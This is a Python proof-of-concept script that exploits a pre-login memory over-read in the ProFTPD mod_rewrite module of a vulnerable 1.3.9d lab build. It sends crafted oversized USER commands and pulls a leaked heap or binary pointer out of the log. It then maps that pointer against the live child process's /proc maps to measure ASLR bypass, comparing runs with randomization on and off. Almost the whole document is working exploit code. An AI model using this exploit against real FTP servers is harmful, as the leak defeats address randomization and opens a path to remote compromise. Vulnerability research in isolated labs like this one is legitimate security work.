#!/usr/bin/env python3
"""Classify the leaked static `substr` pointer against the live ProFTPD child's maps.

Loopback only, pinned vulnerable 1.3.9d plain build, pre-login `%m USER`
config on port 21914. One 1025-code-point USER key makes the `pstrdup()` at
mod_rewrite.c:2072 over-read the eight `substr` bytes; the low byte is an
attacker-chosen 0xe8 and the remaining bytes are the live pointer. The client
keeps the session open, so the forked child that owns the pointer is alive
while its /proc/<pid>/maps is read.

ProFTPD clears the dumpable flag when it drops privileges, so /proc/<pid>/maps
is root-owned on this host: the maps read uses passwordless sudo -n cat. It is
a read-only observation of a lab process started by this script. Nothing is
written through the pointer. Run from this wire/ directory. Prints one ASLR-on
trial followed by one `setarch -R` trial; repeat externally for a sample.
"""
import os
import re
import socket
import subprocess
import time

W = os.path.dirname(os.path.abspath(__file__))
CFG = W + "/etc/proftpd-prelogin-leak.conf"
BIN = W + "/../proftpd-vuln-plain"
LOG = W + "/log/rewrite-prelogin-leak.log"
PORT = 21914
PIDF = W + "/run/proftpd-prelogin-leak.pid"


def read_maps(pid):
    r = subprocess.run(["sudo", "-n", "cat", "/proc/%d/maps" % pid],
                       capture_output=True, text=True)
    return r.stdout.splitlines()


def classify(maps, page):
    for line in maps:
        parts = line.split()
        lo, hi = (int(x, 16) for x in parts[0].split("-"))
        if lo <= page < hi:
            return " ".join(parts[1:])
    return "UNMAPPED"


def pie_base(maps):
    for line in maps:
        parts = line.split()
        if "proftpd-vuln-plain" in line and len(parts) > 1 and parts[1] == "r--p":
            return int(parts[0].split("-")[0], 16)
    return None


def run(setarch):
    tag = "off" if setarch else "on"
    subprocess.run(["fuser", "-k", LOG], capture_output=True)
    subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
    open(LOG, "wb").close()
    server_out = W + "/log/probe-leak-maps-%s.out" % tag
    argv = (["setarch", "x86_64", "-R"] if setarch else []) + [BIN, "-n", "-c", CFG]
    srv = subprocess.Popen(argv, cwd=W, stdout=open(server_out, "wb"),
                           stderr=subprocess.STDOUT)
    res = ["MODE %s" % ("setarch -R" if setarch else "ASLR on")]
    try:
        for _ in range(80):
            try:
                s = socket.create_connection(("127.0.0.1", PORT), 0.3)
                s.close()
                break
            except OSError:
                time.sleep(0.05)
        s = socket.create_connection(("127.0.0.1", PORT), 8)
        s.settimeout(8)
        s.recv(4096)
        parent = int(open(PIDF).read().strip())
        leak, raw = None, None
        for length in (1025, 1026, 1027, 1028):
            key = ("\u00e8" + "A" * (length - 1)).encode("utf-8")
            s.sendall(b"USER " + key + b"\r\n")
            try:
                s.recv(4096)
            except OSError:
                pass
            time.sleep(0.2)
            for line in reversed(open(LOG, "rb").read().split(b"\n")):
                m = re.search(rb"maps subst'd pattern: '([^']*)'", line)
                if m and len(m.group(1)) >= length:
                    raw = m.group(1)[-8:]
                    leak = int.from_bytes(raw[-6:] + b"\x00\x00", "little")
                    break
            if leak is not None:
                res.append("LEAK_KEYLEN %d" % length)
                break
        pmaps = read_maps(parent)
        kids = subprocess.run(["pgrep", "-P", str(parent)],
                              capture_output=True, text=True).stdout.split()
        res.append("PARENT %d CHILDREN %s" % (parent, ",".join(kids)))
        cmaps = []
        for kid in kids:
            cmaps = read_maps(int(kid))
            if cmaps:
                res.append("CHILD %s MAP_LINES %d" % (kid, len(cmaps)))
                break
        res.append("RANDOMIZE_VA %s" %
                   open("/proc/sys/kernel/randomize_va_space").read().strip())
        if leak is None:
            res.append("LEAK NONE LAST8 %s" % (raw.hex() if raw else "none"))
        else:
            page = leak & ~0xfff
            res.append("LEAK_RAW8 %s" % raw.hex())
            res.append("LEAK %#x PAGE %#x" % (leak, page))
            res.append("PARENT_REGION %s" % classify(pmaps, page))
            res.append("CHILD_REGION  %s" % classify(cmaps, page))
            cb, pb = pie_base(cmaps), pie_base(pmaps)
            res.append("PIE_BASE_PARENT %s PIE_BASE_CHILD %s" %
                       ("%#x" % pb if pb else "NONE", "%#x" % cb if cb else "NONE"))
            if cb:
                res.append("LEAK_MINUS_PIE %#x" % (leak - cb))
        with open(W + "/evidence/leak-maps-%s-%d.log" % (tag, parent), "wb") as f:
            f.write(open(LOG, "rb").read())
        s.close()
    finally:
        srv.terminate()
        try:
            srv.wait(timeout=3)
        except subprocess.TimeoutExpired:
            srv.kill()
        subprocess.run(["fuser", "-k", "-n", "tcp", str(PORT)], capture_output=True)
        res.append("SIGNALS %d" %
                   open(server_out, "rb").read().count(b"signal 11"))
    return res


if __name__ == "__main__":
    for with_setarch in (False, True):
        print("\n".join(run(with_setarch)))
        print()
